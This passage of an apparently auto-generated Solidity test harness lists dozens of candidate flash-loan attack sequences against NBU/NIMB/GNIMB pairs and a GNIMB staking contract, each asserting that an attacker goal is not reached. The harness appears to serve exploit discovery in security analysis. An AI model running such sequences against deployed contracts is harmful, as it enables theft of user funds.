        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4249(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4250(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4251(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4252(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4253(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4254(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4255(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4256(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4257(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4258(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4259(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4260(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4261(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4262(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4263(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4264(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4265(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4266(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4267(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4268(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4269(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4270(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4271(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4272(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4273(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4274(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4275(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4276(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4277(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4278(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4279(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4280(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4281(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4282(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4283(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4284(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4285(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4286(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4287(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4288(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4289(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4290(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4291(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4292(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4293(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
